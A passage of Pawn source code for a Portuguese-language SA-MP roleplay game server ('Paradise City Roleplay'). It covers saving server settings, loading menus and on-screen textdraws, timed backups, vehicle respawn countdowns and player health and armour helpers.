	DOF2_SetInt(ficheiro, "EntradaApreendidosVirtualWorld", oInfo[0][EntradaApreendidosVirtualWorld]);
	DOF2_SetInt(ficheiro, "EntradaApreendidosInterior", oInfo[0][EntradaApreendidosInterior]);
	DOF2_SetFloat(ficheiro, "VenderVeiculoX", oInfo[0][VenderVeiculoX]);
	DOF2_SetFloat(ficheiro, "VenderVeiculoY", oInfo[0][VenderVeiculoY]);
	DOF2_SetFloat(ficheiro, "VenderVeiculoZ", oInfo[0][VenderVeiculoZ]);
	DOF2_SetFloat(ficheiro, "CamaraMunicipalX", oInfo[0][CamaraMunicipalX]);
	DOF2_SetFloat(ficheiro, "CamaraMunicipalY", oInfo[0][CamaraMunicipalY]);
	DOF2_SetFloat(ficheiro, "CamaraMunicipalZ", oInfo[0][CamaraMunicipalZ]);
	DOF2_SetInt(ficheiro, "CamaraMunicipalVirtualWorld", oInfo[0][CamaraMunicipalVirtualWorld]);
	DOF2_SetInt(ficheiro, "CamaraMunicipalInterior", oInfo[0][CamaraMunicipalInterior]);
	DOF2_SetInt(ficheiro, "CamaraMunicipalPickupID", oInfo[0][CamaraMunicipalPickupID]);
	DOF2_SetString(ficheiro, "NewsMusica1", oInfo[0][NewsMusica1]);
	DOF2_SetString(ficheiro, "NewsMusica2", oInfo[0][NewsMusica2]);
	DOF2_SetString(ficheiro, "NewsMusica3", oInfo[0][NewsMusica3]);
	DOF2_SetString(ficheiro, "NewsMusica4", oInfo[0][NewsMusica4]);
	DOF2_SetString(ficheiro, "NewsMusica5", oInfo[0][NewsMusica5]);
	DOF2_SetString(ficheiro, "NewsMusica6", oInfo[0][NewsMusica6]);
	DOF2_SetString(ficheiro, "NewsMusica1Alterador", oInfo[0][NewsMusica1Alterador]);
	DOF2_SetString(ficheiro, "NewsMusica2Alterador", oInfo[0][NewsMusica2Alterador]);
	DOF2_SetString(ficheiro, "NewsMusica3Alterador", oInfo[0][NewsMusica3Alterador]);
	DOF2_SetString(ficheiro, "NewsMusica4Alterador", oInfo[0][NewsMusica4Alterador]);
	DOF2_SetString(ficheiro, "NewsMusica5Alterador", oInfo[0][NewsMusica5Alterador]);
	DOF2_SetString(ficheiro, "NewsMusica6Alterador", oInfo[0][NewsMusica6Alterador]);
	DOF2_SetString(ficheiro, "NewsMusica1Nome", oInfo[0][NewsMusica1Nome]);
	DOF2_SetString(ficheiro, "NewsMusica2Nome", oInfo[0][NewsMusica2Nome]);
	DOF2_SetString(ficheiro, "NewsMusica3Nome", oInfo[0][NewsMusica3Nome]);
	DOF2_SetString(ficheiro, "NewsMusica4Nome", oInfo[0][NewsMusica4Nome]);
	DOF2_SetString(ficheiro, "NewsMusica5Nome", oInfo[0][NewsMusica5Nome]);
	DOF2_SetString(ficheiro, "NewsMusica6Nome", oInfo[0][NewsMusica6Nome]);
	DOF2_SetInt(ficheiro, "ImpostoCarros", oInfo[0][ImpostoCarros]);
	DOF2_SetInt(ficheiro, "ImpostoCasas", oInfo[0][ImpostoCasas]);
	DOF2_SetInt(ficheiro, "ImpostoLojas", oInfo[0][ImpostoLojas]);
	DOF2_SetFloat(ficheiro, "AeroportoX", oInfo[0][AeroportoX]);
	DOF2_SetFloat(ficheiro, "AeroportoY", oInfo[0][AeroportoY]);
	DOF2_SetFloat(ficheiro, "AeroportoZ", oInfo[0][AeroportoZ]);
	DOF2_SetInt(ficheiro, "AeroportoVirtualWorld", oInfo[0][AeroportoVirtualWorld]);
	DOF2_SetInt(ficheiro, "AeroportoInterior", oInfo[0][AeroportoInterior]);
	DOF2_SetInt(ficheiro, "AeroportoPickupID", oInfo[0][AeroportoPickupID]);
	
	DOF2_SaveFile();

	return 1;
}

public CarregarServidor()
{
	DisableNameTagLOS();
    ManualVehicleEngineAndLights();
    DisableInteriorEnterExits();
    ShowPlayerMarkers(0);
    EnableStuntBonusForAll(0);
    Streamer_ToggleErrorCallback(1);
    
	CarregarCidades();
	CarregarJobs();
	CarregarCarros();
	CarregarBizzes();
	CarregarMenus();
	CarregarCasas();
	CarregarFactions();
	CarregarBuildings();
	CarregarOutros();
	CarregarStats();
	DesligarMotores();
	CarregarMapas();
	
 	if(!LogExists(LOG_MONEY)) CreateLog(LOG_MONEY);
 	if(!LogExists(LOG_JOIN)) CreateLog(LOG_JOIN);
 	if(!LogExists(LOG_HACK)) CreateLog(LOG_HACK);
 	if(!LogExists(LOG_BAN)) CreateLog(LOG_BAN);
 	if(!LogExists(LOG_KICK)) CreateLog(LOG_KICK);
 	if(!LogExists(LOG_INCOMING)) CreateLog(LOG_INCOMING);
	if(!LogExists(LOG_CMDS)) CreateLog(LOG_CMDS);
	if(!LogExists(LOG_ERROR)) CreateLog(LOG_ERROR);
	if(!LogExists(LOG_CHAT)) CreateLog(LOG_CHAT);
	if(!LogExists(LOG_SOCKET)) CreateLog(LOG_SOCKET);

	ListaSkins = LoadModelSelectionMenu("skins.txt");
	ListaAcessorios = LoadModelSelectionMenu("acessorios.txt");
	ListaCarros = LoadModelSelectionMenu("carros.txt");
	ListaCarrosComprar = LoadModelSelectionMenu("carros.txt");
	ListaObjetos = LoadModelSelectionMenu("objetos.txt");
	ListaObjetosComprar = LoadModelSelectionMenu("objetos.txt");
	
	EnableAntiCheat(30, 0);
	EnableAntiCheat(44, 0);
	EnableAntiCheat(52, 0);
	
	zonaPescar = CreateDynamicCircle(574, -2510, 80, -1, -1, -1);
	
	new Hour, Minute, Second;
	gettime(Hour, Minute, Second);
	SetWorldTime(Hour);
	
	// RELéGIO
	
	relogio = TextDrawCreate(544.666625, 24.488906, "00:00:00");
	TextDrawLetterSize(relogio, 0.400000, 1.600000);
	TextDrawAlignment(relogio, 1);
	TextDrawColor(relogio, -1);
	TextDrawSetShadow(relogio, 0);
	TextDrawSetOutline(relogio, 0);
	TextDrawBackgroundColor(relogio, 255);
	TextDrawFont(relogio, 1);
	TextDrawSetProportional(relogio, 1);
	TextDrawSetShadow(relogio, 0);

	// INTRO
	
	TDEditor_TD[0] = TextDrawCreate(-30.666690, -2.888933, "_~n~");
	TextDrawLetterSize(TDEditor_TD[0], 0.378333, 55.350238);
	TextDrawTextSize(TDEditor_TD[0], 1303.000000, 0.000000);
	TextDrawAlignment(TDEditor_TD[0], 1);
	TextDrawColor(TDEditor_TD[0], -1);
	TextDrawUseBox(TDEditor_TD[0], 1);
	TextDrawBoxColor(TDEditor_TD[0], 255);
	TextDrawSetShadow(TDEditor_TD[0], 0);
	TextDrawSetOutline(TDEditor_TD[0], 0);
	TextDrawBackgroundColor(TDEditor_TD[0], -1);
	TextDrawFont(TDEditor_TD[0], 1);
	TextDrawSetProportional(TDEditor_TD[0], 1);
	TextDrawSetShadow(TDEditor_TD[0], 0);
	
	TDEditor_TD[6] = TextDrawCreate(205.666992, 17.436975, "Portugal_Fun_Maps apresenta...");
	TextDrawLetterSize(TDEditor_TD[6], 0.400000, 1.600000);
	TextDrawAlignment(TDEditor_TD[6], 1);
	TextDrawColor(TDEditor_TD[6], -1);
	TextDrawSetShadow(TDEditor_TD[6], 0);
	TextDrawSetOutline(TDEditor_TD[6], 0);
	TextDrawBackgroundColor(TDEditor_TD[6], 255);
	TextDrawFont(TDEditor_TD[6], 2);
	TextDrawSetProportional(TDEditor_TD[6], 1);
	TextDrawSetShadow(TDEditor_TD[6], 0);

	TDEditor_TD[1] = TextDrawCreate(214.666748, 42.740730, "PARADISE_CITY");
	TextDrawLetterSize(TDEditor_TD[1], 0.676998, 4.756740);
	TextDrawAlignment(TDEditor_TD[1], 1);
	TextDrawColor(TDEditor_TD[1], -16776961);
	TextDrawSetShadow(TDEditor_TD[1], 0);
	TextDrawSetOutline(TDEditor_TD[1], 1);
	TextDrawBackgroundColor(TDEditor_TD[1], 255);
	TextDrawFont(TDEditor_TD[1], 2);
	TextDrawSetProportional(TDEditor_TD[1], 1);
	TextDrawSetShadow(TDEditor_TD[1], 0);

	TDEditor_TD[2] = TextDrawCreate(239.000305, 75.925918, "ROLEPLAY");
	TextDrawLetterSize(TDEditor_TD[2], 1.073333, 4.478813);
	TextDrawAlignment(TDEditor_TD[2], 1);
	TextDrawColor(TDEditor_TD[2], -1);
	TextDrawSetShadow(TDEditor_TD[2], 0);
	TextDrawSetOutline(TDEditor_TD[2], 1);
	TextDrawBackgroundColor(TDEditor_TD[2], 255);
	TextDrawFont(TDEditor_TD[2], 3);
	TextDrawSetProportional(TDEditor_TD[2], 1);
	TextDrawSetShadow(TDEditor_TD[2], 0);

	TDEditor_TD[3] = TextDrawCreate(204.666763, 41.496303, "-~n~");
	TextDrawLetterSize(TDEditor_TD[3], 16.201004, 1.226665);
	TextDrawAlignment(TDEditor_TD[3], 1);
	TextDrawColor(TDEditor_TD[3], -65281);
	TextDrawSetShadow(TDEditor_TD[3], 0);
	TextDrawSetOutline(TDEditor_TD[3], 0);
	TextDrawBackgroundColor(TDEditor_TD[3], 255);
	TextDrawFont(TDEditor_TD[3], 1);
	TextDrawSetProportional(TDEditor_TD[3], 1);
	TextDrawSetShadow(TDEditor_TD[3], 0);

	TDEditor_TD[4] = TextDrawCreate(206.000015, 118.651931, "-~n~");
	TextDrawLetterSize(TDEditor_TD[4], 16.201004, 1.226665);
	TextDrawAlignment(TDEditor_TD[4], 1);
	TextDrawColor(TDEditor_TD[4], -65281);
	TextDrawSetShadow(TDEditor_TD[4], 0);
	TextDrawSetOutline(TDEditor_TD[4], 0);
	TextDrawBackgroundColor(TDEditor_TD[4], 255);
	TextDrawFont(TDEditor_TD[4], 1);
	TextDrawSetProportional(TDEditor_TD[4], 1);
	TextDrawSetShadow(TDEditor_TD[4], 0);

	TDEditor_TD[5] = TextDrawCreate(232.999969, 388.696411, "A_carregar_servidor~n~");
	TextDrawLetterSize(TDEditor_TD[5], 0.400000, 1.600000);
	TextDrawAlignment(TDEditor_TD[5], 1);
	TextDrawColor(TDEditor_TD[5], 16711935);
	TextDrawSetShadow(TDEditor_TD[5], 0);
	TextDrawSetOutline(TDEditor_TD[5], 0);
	TextDrawBackgroundColor(TDEditor_TD[5], 255);
	TextDrawFont(TDEditor_TD[5], 2);
	TextDrawSetProportional(TDEditor_TD[5], 1);
	TextDrawSetShadow(TDEditor_TD[5], 0);

	// VELOCIMETRO
	
	TDEditor_TDVel[0] = TextDrawCreate(380.000000, 397.407592, "i");
	TextDrawLetterSize(TDEditor_TDVel[0], 28.800073, 2.599997);
	TextDrawAlignment(TDEditor_TDVel[0], 1);
	TextDrawColor(TDEditor_TDVel[0], -7929766);
	TextDrawSetShadow(TDEditor_TDVel[0], 0);
	TextDrawSetOutline(TDEditor_TDVel[0], 0);
	TextDrawBackgroundColor(TDEditor_TDVel[0], 255);
	TextDrawFont(TDEditor_TDVel[0], 2);
	TextDrawSetProportional(TDEditor_TDVel[0], 1);
	TextDrawSetShadow(TDEditor_TDVel[0], 0);

	TDEditor_TDVel[1] = TextDrawCreate(380.000000, 382.889099, "i");
	TextDrawLetterSize(TDEditor_TDVel[1], 28.800073, 2.599997);
	TextDrawAlignment(TDEditor_TDVel[1], 1);
	TextDrawColor(TDEditor_TDVel[1], -7929766);
	TextDrawSetShadow(TDEditor_TDVel[1], 0);
	TextDrawSetOutline(TDEditor_TDVel[1], 0);
	TextDrawBackgroundColor(TDEditor_TDVel[1], 255);
	TextDrawFont(TDEditor_TDVel[1], 2);
	TextDrawSetProportional(TDEditor_TDVel[1], 1);
	TextDrawSetShadow(TDEditor_TDVel[1], 0);

	TDEditor_TDVel[2] = TextDrawCreate(380.000000, 368.370635, "i");
	TextDrawLetterSize(TDEditor_TDVel[2], 28.800073, 2.599997);
	TextDrawAlignment(TDEditor_TDVel[2], 1);
	TextDrawColor(TDEditor_TDVel[2], -7929766);
	TextDrawSetShadow(TDEditor_TDVel[2], 0);
	TextDrawSetOutline(TDEditor_TDVel[2], 0);
	TextDrawBackgroundColor(TDEditor_TDVel[2], 255);
	TextDrawFont(TDEditor_TDVel[2], 2);
	TextDrawSetProportional(TDEditor_TDVel[2], 1);
	TextDrawSetShadow(TDEditor_TDVel[2], 0);

	TDEditor_TDVel[3] = TextDrawCreate(380.000000, 353.852142, "i");
	TextDrawLetterSize(TDEditor_TDVel[3], 28.800073, 2.599997);
	TextDrawAlignment(TDEditor_TDVel[3], 1);
	TextDrawColor(TDEditor_TDVel[3], -7929766);
	TextDrawSetShadow(TDEditor_TDVel[3], 0);
	TextDrawSetOutline(TDEditor_TDVel[3], 0);
	TextDrawBackgroundColor(TDEditor_TDVel[3], 255);
	TextDrawFont(TDEditor_TDVel[3], 2);
	TextDrawSetProportional(TDEditor_TDVel[3], 1);
	TextDrawSetShadow(TDEditor_TDVel[3], 0);

	TDEditor_TDVel[4] = TextDrawCreate(380.000000, 339.333435, "i");
	TextDrawLetterSize(TDEditor_TDVel[4], 28.800073, 2.599997);
	TextDrawAlignment(TDEditor_TDVel[4], 1);
	TextDrawColor(TDEditor_TDVel[4], -7929766);
	TextDrawSetShadow(TDEditor_TDVel[4], 0);
	TextDrawSetOutline(TDEditor_TDVel[4], 0);
	TextDrawBackgroundColor(TDEditor_TDVel[4], 255);
	TextDrawFont(TDEditor_TDVel[4], 2);
	TextDrawSetProportional(TDEditor_TDVel[4], 1);
	TextDrawSetShadow(TDEditor_TDVel[4], 0);

	TDEditor_TDVel[5] = TextDrawCreate(486.000000, 348.044158, "Velocidade:");
	TextDrawLetterSize(TDEditor_TDVel[5], 0.265666, 1.139554);
	TextDrawAlignment(TDEditor_TDVel[5], 1);
	TextDrawColor(TDEditor_TDVel[5], -1);
	TextDrawSetShadow(TDEditor_TDVel[5], 0);
	TextDrawSetOutline(TDEditor_TDVel[5], 1);
	TextDrawBackgroundColor(TDEditor_TDVel[5], 255);
	TextDrawFont(TDEditor_TDVel[5], 1);
	TextDrawSetProportional(TDEditor_TDVel[5], 1);
	TextDrawSetShadow(TDEditor_TDVel[5], 0);

	TDEditor_TDVel[6] = TextDrawCreate(486.000000, 362.148315, "Combustivel:");
	TextDrawLetterSize(TDEditor_TDVel[6], 0.265666, 1.139554);
	TextDrawAlignment(TDEditor_TDVel[6], 1);
	TextDrawColor(TDEditor_TDVel[6], -1);
	TextDrawSetShadow(TDEditor_TDVel[6], 0);
	TextDrawSetOutline(TDEditor_TDVel[6], 1);
	TextDrawBackgroundColor(TDEditor_TDVel[6], 255);
	TextDrawFont(TDEditor_TDVel[6], 1);
	TextDrawSetProportional(TDEditor_TDVel[6], 1);
	TextDrawSetShadow(TDEditor_TDVel[6], 0);

	TDEditor_TDVel[7] = TextDrawCreate(486.000000, 376.666870, "Quilometros:");
	TextDrawLetterSize(TDEditor_TDVel[7], 0.265666, 1.139554);
	TextDrawAlignment(TDEditor_TDVel[7], 1);
	TextDrawColor(TDEditor_TDVel[7], -1);
	TextDrawSetShadow(TDEditor_TDVel[7], 0);
	TextDrawSetOutline(TDEditor_TDVel[7], 1);
	TextDrawBackgroundColor(TDEditor_TDVel[7], 255);
	TextDrawFont(TDEditor_TDVel[7], 1);
	TextDrawSetProportional(TDEditor_TDVel[7], 1);
	TextDrawSetShadow(TDEditor_TDVel[7], 0);

	TDEditor_TDVel[8] = TextDrawCreate(486.000000, 390.770629, "Travao:");
	TextDrawLetterSize(TDEditor_TDVel[8], 0.265666, 1.139554);
	TextDrawAlignment(TDEditor_TDVel[8], 1);
	TextDrawColor(TDEditor_TDVel[8], -1);
	TextDrawSetShadow(TDEditor_TDVel[8], 0);
	TextDrawSetOutline(TDEditor_TDVel[8], 1);
	TextDrawBackgroundColor(TDEditor_TDVel[8], 255);
	TextDrawFont(TDEditor_TDVel[8], 1);
	TextDrawSetProportional(TDEditor_TDVel[8], 1);
	TextDrawSetShadow(TDEditor_TDVel[8], 0);

	TDEditor_TDVel[9] = TextDrawCreate(486.000000, 404.874328, "Consumo:");
	TextDrawLetterSize(TDEditor_TDVel[9], 0.265666, 1.139554);
	TextDrawAlignment(TDEditor_TDVel[9], 1);
	TextDrawColor(TDEditor_TDVel[9], -1);
	TextDrawSetShadow(TDEditor_TDVel[9], 0);
	TextDrawSetOutline(TDEditor_TDVel[9], 1);
	TextDrawBackgroundColor(TDEditor_TDVel[9], 255);
	TextDrawFont(TDEditor_TDVel[9], 1);
	TextDrawSetProportional(TDEditor_TDVel[9], 1);
	TextDrawSetShadow(TDEditor_TDVel[9], 0);

	TDEditor_TDVel[10] = TextDrawCreate(561.000183, 348.044891, "KM/H");
	TextDrawLetterSize(TDEditor_TDVel[10], 0.265666, 1.139554);
	TextDrawAlignment(TDEditor_TDVel[10], 1);
	TextDrawColor(TDEditor_TDVel[10], -1);
	TextDrawSetShadow(TDEditor_TDVel[10], 0);
	TextDrawSetOutline(TDEditor_TDVel[10], 1);
	TextDrawBackgroundColor(TDEditor_TDVel[10], 255);
	TextDrawFont(TDEditor_TDVel[10], 1);
	TextDrawSetProportional(TDEditor_TDVel[10], 1);
	TextDrawSetShadow(TDEditor_TDVel[10], 0);

	TDEditor_TDVel[11] = TextDrawCreate(566.000366, 362.563568, "L");
	TextDrawLetterSize(TDEditor_TDVel[11], 0.265666, 1.139554);
	TextDrawAlignment(TDEditor_TDVel[11], 1);
	TextDrawColor(TDEditor_TDVel[11], -1);
	TextDrawSetShadow(TDEditor_TDVel[11], 0);
	TextDrawSetOutline(TDEditor_TDVel[11], 1);
	TextDrawBackgroundColor(TDEditor_TDVel[11], 255);
	TextDrawFont(TDEditor_TDVel[11], 1);
	TextDrawSetProportional(TDEditor_TDVel[11], 1);
	TextDrawSetShadow(TDEditor_TDVel[11], 0);

	TDEditor_TDVel[12] = TextDrawCreate(585.000244, 377.081939, "KM");
	TextDrawLetterSize(TDEditor_TDVel[12], 0.265666, 1.139554);
	TextDrawAlignment(TDEditor_TDVel[12], 1);
	TextDrawColor(TDEditor_TDVel[12], -1);
	TextDrawSetShadow(TDEditor_TDVel[12], 0);
	TextDrawSetOutline(TDEditor_TDVel[12], 1);
	TextDrawBackgroundColor(TDEditor_TDVel[12], 255);
	TextDrawFont(TDEditor_TDVel[12], 1);
	TextDrawSetProportional(TDEditor_TDVel[12], 1);
	TextDrawSetShadow(TDEditor_TDVel[12], 0);

	TDEditor_TDVel[13] = TextDrawCreate(545.999938, 405.704193, "L/100");
	TextDrawLetterSize(TDEditor_TDVel[13], 0.265666, 1.139554);
	TextDrawAlignment(TDEditor_TDVel[13], 1);
	TextDrawColor(TDEditor_TDVel[13], -1);
	TextDrawSetShadow(TDEditor_TDVel[13], 0);
	TextDrawSetOutline(TDEditor_TDVel[13], 1);
	TextDrawBackgroundColor(TDEditor_TDVel[13], 255);
	TextDrawFont(TDEditor_TDVel[13], 1);
	TextDrawSetProportional(TDEditor_TDVel[13], 1);
	TextDrawSetShadow(TDEditor_TDVel[13], 0);
	
	// IN GAME
	
	TDEditor_TDInGame[0] = TextDrawCreate(3.000030, 433.496246, "paradise_city_");
	TextDrawLetterSize(TDEditor_TDInGame[0], 0.349999, 1.185184);
	TextDrawAlignment(TDEditor_TDInGame[0], 1);
	TextDrawColor(TDEditor_TDInGame[0], -16776961);
	TextDrawSetShadow(TDEditor_TDInGame[0], 0);
	TextDrawSetOutline(TDEditor_TDInGame[0], 1);
	TextDrawBackgroundColor(TDEditor_TDInGame[0], 255);
	TextDrawFont(TDEditor_TDInGame[0], 3);
	TextDrawSetProportional(TDEditor_TDInGame[0], 1);
	TextDrawSetShadow(TDEditor_TDInGame[0], 0);

	TDEditor_TDInGame[1] = TextDrawCreate(92.000053, 433.910980, "Roleplay");
	TextDrawLetterSize(TDEditor_TDInGame[1], 0.349999, 1.185184);
	TextDrawAlignment(TDEditor_TDInGame[1], 1);
	TextDrawColor(TDEditor_TDInGame[1], -1);
	TextDrawSetShadow(TDEditor_TDInGame[1], 0);
	TextDrawSetOutline(TDEditor_TDInGame[1], 1);
	TextDrawBackgroundColor(TDEditor_TDInGame[1], 255);
	TextDrawFont(TDEditor_TDInGame[1], 3);
	TextDrawSetProportional(TDEditor_TDInGame[1], 1);
	TextDrawSetShadow(TDEditor_TDInGame[1], 0);
	
	TDEditor_TDInGame[2] = TextDrawCreate(480.998657, 432.666442, "WWW.~n~");
	TextDrawLetterSize(TDEditor_TDInGame[2], 0.310665, 1.330368);
	TextDrawAlignment(TDEditor_TDInGame[2], 2);
	TextDrawColor(TDEditor_TDInGame[2], -16776961);
	TextDrawSetShadow(TDEditor_TDInGame[2], 0);
	TextDrawSetOutline(TDEditor_TDInGame[2], 1);
	TextDrawBackgroundColor(TDEditor_TDInGame[2], 255);
	TextDrawFont(TDEditor_TDInGame[2], 2);
	TextDrawSetProportional(TDEditor_TDInGame[2], 1);
	TextDrawSetShadow(TDEditor_TDInGame[2], 0);
	TextDrawSetSelectable(TDEditor_TDInGame[2], true);

	TDEditor_TDInGame[3] = TextDrawCreate(497.269775, 432.451629, "PORTUGALFUNMAPS~n~");
	TextDrawLetterSize(TDEditor_TDInGame[3], 0.310665, 1.330368);
	TextDrawAlignment(TDEditor_TDInGame[3], 1);
	TextDrawColor(TDEditor_TDInGame[3], -1);
	TextDrawSetShadow(TDEditor_TDInGame[3], 0);
	TextDrawSetOutline(TDEditor_TDInGame[3], -1);
	TextDrawBackgroundColor(TDEditor_TDInGame[3], 255);
	TextDrawFont(TDEditor_TDInGame[3], 2);
	TextDrawSetProportional(TDEditor_TDInGame[3], 1);
	TextDrawSetShadow(TDEditor_TDInGame[3], 0);
	TextDrawSetSelectable(TDEditor_TDInGame[3], true);

	TDEditor_TDInGame[4] = TextDrawCreate(617.330993, 432.666625, ".PT~n~");
	TextDrawLetterSize(TDEditor_TDInGame[4], 0.310665, 1.330368);
	TextDrawAlignment(TDEditor_TDInGame[4], 1);
	TextDrawColor(TDEditor_TDInGame[4], -16776961);
	TextDrawSetShadow(TDEditor_TDInGame[4], 0);
	TextDrawSetOutline(TDEditor_TDInGame[4], 1);
	TextDrawBackgroundColor(TDEditor_TDInGame[4], 255);
	TextDrawFont(TDEditor_TDInGame[4], 2);
	TextDrawSetProportional(TDEditor_TDInGame[4], 1);
	TextDrawSetShadow(TDEditor_TDInGame[4], 0);
	TextDrawSetSelectable(TDEditor_TDInGame[4], true);
	
	return 1;
}

public GuardarServidor()
{
	new string[128];
	new tick1;
	new tick2;

	tick1 = GetTickCount();
	
	format(string, sizeof(string), "[BACKUP:] {FFFFFF}Está a haver um backup neste momento. Podem experienciar um pouco de lag");
	SendClientMessageToAll(COLOR_ORANGE, string);
	
 	foreach(new i : Player)
    {
        // if(!IsPlayerConnected(i)) continue;
		GuardarJogador(i);
    }
	
	GuardarCidades();
    GuardarJobs();
    GuardarCarros();
    GuardarOutros();
    GuardarStats();
    GuardarBizzes();
    GuardarCasas();
    GuardarFactions();
    GuardarBuildings();
    
	for(new i = 0; i < MAX_BUSINESS; i++)
	{
	    if(i == 0) continue;

	    AtualizarBiz(i);
	}
    
    format(string, sizeof(string), "[BACKUP:] {FFFFFF}Backup terminado");
    SendClientMessageToAll(COLOR_ORANGE, string);
    
    tick2 = GetTickCount();
    
    foreach(new i : Player)
    {
        // if(!IsPlayerConnected(i)) continue;
        if(pInfo[i][Admin] == 0) continue;
        if(DebugStatus[i] == false) continue;
        
        format(string, sizeof(string), "[BACKUP:] {FFFFFF}Tempo de backup: %d ms", tick2-tick1);
        SendClientMessage(i, COLOR_ORANGE, string);
    }
    
    return 1;
}

public RespawnGeral()
{
	switch(RespawnCounter)
	{
	    case 1: { GameTextForAll("~w~10", 999, 6); PlaySoundForAll(1058); RespawnCounter++;}
		case 2: { GameTextForAll("~w~9", 999, 6); PlaySoundForAll(1058); RespawnCounter++;}
		case 3: { GameTextForAll("~w~8", 999, 6); PlaySoundForAll(1058); RespawnCounter++;}
		case 4: { GameTextForAll("~w~7", 999, 6); PlaySoundForAll(1058); RespawnCounter++;}
		case 5: { GameTextForAll("~w~6", 999, 6); PlaySoundForAll(1058); RespawnCounter++;}
		case 6: { GameTextForAll("~w~5", 999, 6); PlaySoundForAll(1058); RespawnCounter++;}
		case 7: { GameTextForAll("~w~4", 999, 6); PlaySoundForAll(1058); RespawnCounter++;}
		case 8: { GameTextForAll("~r~3", 999, 6); PlaySoundForAll(1058); RespawnCounter++;}
		case 9: { GameTextForAll("~b~2", 999, 6); PlaySoundForAll(1058); RespawnCounter++;}
		case 10: { GameTextForAll("~g~1", 999, 6); PlaySoundForAll(1058); RespawnCounter++;}
		case 11:
		{
		    KillTimer(TimerRespawn);
  			PlaySoundForAll(4203);
		    GameTextForAll("~y~RESPAWN", 2000, 6);
			RespawnCounter = 0;
			
			for(new car = 1; car < MAX_CARROS; car++)
			{
			    new model = GetVehicleModel(car);
			    new Float:health;

				GetVehicleHealth(car, health);
			    cInfo[car][Vida] = health;

				if(!IsVehicleOccupied(car) && model != 450 && model != 584)
				{
					IsARespawn[car] = true;
					SetVehicleToRespawn(car);
					AtualizarDanosCarro(car);
				}
			}
		}
	}
	return 1;
}

public RespawnJobFac()
{
	switch(RespawnCounterJob)
	{
	    case 1: { GameTextForAll("~w~10", 999, 6); PlaySoundForAll(1058); RespawnCounterJob++;}
		case 2: { GameTextForAll("~w~9", 999, 6); PlaySoundForAll(1058); RespawnCounterJob++;}
		case 3: { GameTextForAll("~w~8", 999, 6); PlaySoundForAll(1058); RespawnCounterJob++;}
		case 4: { GameTextForAll("~w~7", 999, 6); PlaySoundForAll(1058); RespawnCounterJob++;}
		case 5: { GameTextForAll("~w~6", 999, 6); PlaySoundForAll(1058); RespawnCounterJob++;}
		case 6: { GameTextForAll("~w~5", 999, 6); PlaySoundForAll(1058); RespawnCounterJob++;}
		case 7: { GameTextForAll("~w~4", 999, 6); PlaySoundForAll(1058); RespawnCounterJob++;}
		case 8: { GameTextForAll("~r~3", 999, 6); PlaySoundForAll(1058); RespawnCounterJob++;}
		case 9: { GameTextForAll("~b~2", 999, 6); PlaySoundForAll(1058); RespawnCounterJob++;}
		case 10: { GameTextForAll("~g~1", 999, 6); PlaySoundForAll(1058); RespawnCounterJob++;}
		case 11:
		{
		    KillTimer(TimerRespawnJobFac);
  			PlaySoundForAll(4203);
		    GameTextForAll("~y~RESPAWN", 2000, 6);
			RespawnCounterJob = 0;
			
			new bool: trailer1 = false; // 41
			new bool: trailer2 = false; // 42
			new bool: trailer3 = false; // 43
			new bool: trailer4 = false; // 44
			
			new bool: trailer5 = false; // 47
			new bool: trailer6 = false; // 48
			new bool: trailer7 = false; // 48
			new bool: trailer8 = false; // 50

			for(new car = 0; car < MAX_CARROS; car++)
			{
			    new model = GetVehicleModel(car);
			    cInfo[car][Vida] = 1000;

				if(!IsVehicleOccupied(car) && model != 450 && model != 584 && cInfo[car][Type] != -1 && cInfo[car][Type] != -2)
				{
					SetVehicleToRespawn(car);
					AtualizarDanosCarro(car);
				}

				if(cInfo[car][Type] == 7)
				{
				    if(IsTrailerAttachedToVehicle(car))
					{
						new trailerid = GetVehicleTrailer(car);
						
						switch(trailerid)
						{
							case 40: { trailer1 = true; }
							case 41: { trailer2 = true; }
							case 42: { trailer3 = true; }
							case 43: { trailer1 = true; }
							case 47: { trailer2 = true; }
							case 48: { trailer3 = true; }
							case 49: { trailer1 = true; }
							case 50: { trailer2 = true; }
						}
					}
					if(trailer1 == false) SetVehicleToRespawn(40);
					if(trailer2 == false) SetVehicleToRespawn(41);
					if(trailer3 == false) SetVehicleToRespawn(42);
					if(trailer4 == false) SetVehicleToRespawn(43);
					if(trailer5 == false) SetVehicleToRespawn(47);
					if(trailer6 == false) SetVehicleToRespawn(48);
					if(trailer7 == false) SetVehicleToRespawn(49);
					if(trailer8 == false) SetVehicleToRespawn(50);
				}
			}
		}
	}
	return 1;
}

public PlaySoundForAll(soundid)
{
	foreach(new i : Player)
	{
		PlayerPlaySound(i, soundid, 0.0, 0.0, 0.0);
	}
	return 1;
}

public JogadorPuxaJogador(playerid, giveplayerid)
{
	new Float:pX, Float:pY, Float:pZ;

	GetPlayerPos(playerid, pX, pY, pZ);
	SetPlayerPosEx(giveplayerid, pX, pY, pZ);

	return 1;
}

public DesligarMotores()
{
	new engine, lights, alarm, doors, bonnet, boot, objective;

    for(new i = 0; i < MAX_CARROS; i++)
	{
	    if(IsVehicleOccupied(i) == 1) continue;
	    
		GetVehicleParamsEx(i,engine,lights,alarm,doors,bonnet,boot,objective);
		SetVehicleParamsEx(i, 0,lights,alarm,doors,bonnet,boot,objective);
		Motor[i] = false;
    }
}

public SetPlayerHealthEx(playerid, Float:vida, type)
{
	new Float:current;
	GetPlayerHealth(playerid, current);
	
	switch(type)
	{
	    case 0:
	    {
	        SetPlayerHealth(playerid, vida);
	        pInfo[playerid][Vida] = vida;
	    }
		case 1:
		{
			SetPlayerHealth(playerid, current+vida);
			pInfo[playerid][Vida] = current+vida;
		}
		case 2:
		{
		    SetPlayerHealth(playerid, current-vida);
		    pInfo[playerid][Vida] = current-vida;
		}
		default:
		{
		    return 0;
		}
	}
	
	return 1;
}

public SetPlayerArmourEx(playerid, Float:colete, type)
{
	new Float:current;
	GetPlayerArmour(playerid, current);

	switch(type)
	{
	    case 0:
	    {
	        SetPlayerArmour(playerid, colete);
	    }
		case 1:
		{
			SetPlayerArmour(playerid, current+colete);
		}
		case 2:
		{
		    SetPlayerArmour(playerid, current-colete);
		}
		default:
		{
		    return 0;
		}
	}
	
	return 1;
}

public SetVehiclePosEx(vehicleid, Float:x, Float:y, Float:z)
{
	new pid = IsVehicleOccupied(vehicleid);
	
    SetVehiclePos(vehicleid, x, y, z+0.3);
	
	if(pid != 0)
	{
 		Streamer_UpdateEx(pid, x, y, z, -1, -1);
	}
	else
	{
	   	if(cInfo[vehicleid][IsCaravana] == 1 || cInfo[vehicleid][IsCaravana] == 2)
		{
